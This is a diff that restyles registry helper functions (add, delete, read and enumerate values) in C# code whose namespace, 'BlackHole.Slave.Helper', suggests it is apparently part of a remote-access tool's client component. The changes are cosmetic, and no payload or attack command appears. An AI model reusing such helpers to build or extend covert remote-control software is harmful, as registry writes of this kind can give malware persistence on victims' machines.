@@ -9,13 +9,12 @@ namespace BlackHole.Slave.Helper
     {
         public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false) =>
             RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path,
-                (key) =>
+                key =>
                 {
                     if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                         value = "\"" + value + "\"";
 
                     key.SetValue(name, value);
-
                     return true;
                 });
 
@@ -27,6 +26,7 @@ namespace BlackHole.Slave.Helper
                 {
                     if (key == null)
                         return false;
+
                     return onSuccess(key);
                 }
             }
@@ -38,14 +38,14 @@ namespace BlackHole.Slave.Helper
 
         public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name) =>
             RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path,
-                (key) =>
+                key =>
                 {
                     key.DeleteValue(name, true);
                     return true;
                 });
         
         private static bool IsNameOrValueNull(this string keyName, RegistryKey key) =>
-            (string.IsNullOrEmpty(keyName) || (key == null));
+            string.IsNullOrEmpty(keyName) || (key == null);
         
         public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
         {
@@ -97,8 +97,11 @@ namespace BlackHole.Slave.Helper
         {
             if (key == null)
                 yield break;
-            foreach (var k in key.GetValueNames().Where(keyVal => !keyVal.IsNameOrValueNull(key)).Where(k => !string.IsNullOrEmpty(k)))            
-                yield return string.Format("{0}||{1}", k, key.GetValueSafe(k));            
+
+            foreach (var k in key.GetValueNames()
+                .Where(keyVal => !keyVal.IsNameOrValueNull(key))
+                .Where(k => !string.IsNullOrEmpty(k)))            
+                yield return $"{k}||{key.GetValueSafe(k)}";            
         }
     }
 }
